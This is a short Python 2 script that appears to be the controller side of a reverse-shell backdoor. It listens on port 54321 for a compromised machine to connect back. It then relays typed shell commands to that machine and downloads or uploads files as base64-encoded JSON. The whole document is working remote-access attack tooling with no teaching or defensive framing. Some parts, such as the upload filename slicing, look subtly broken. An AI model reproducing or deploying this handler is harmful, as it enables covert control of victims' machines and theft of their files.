#!/usr/bin/python

import socket 
import base64
import json


def reliable_send(data):
    json_data = json.dumps(data)
    target.send(json_data)

def reliable_recv():
    data = ""
    while True:
        try:
            data = data + target.recv(1024)
            return json.loads(data)
        except ValueError:
            continue

def shell():
    while True:
        command = raw_input("* Shell#~%s: " % str(ip))
        reliable_send(command)
        if command == 'q':
            break
        elif command[:2] == "cd" and len(command) > 1:
            continue
        elif command[:8] == "download":
            with open(command[9:], "wb") as file:
                file_data = reliable_recv()
                file.write(base64.b64decode(file_data))
        elif command[:6] == "upload":
            try:
                with open(command[1:], "rb") as fin:
                    reliable_send(base64.b64encode(fin.read()))
            except:
                failed = "Failed To Upload"
                reliable_send(base64.b64encode(failed))
        else:
            result = reliable_recv()
            print(result)

def server():
    global s
    global ip
    global target

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((ip,54321))
    s.listen(5)

    print("[+] Listening For Incoming Connection")
    target, ip = s.accept()
    print("[+] Connection Established From: %s" % str(ip))

ip  = "127.0.0.1"

server()
shell()
s.close()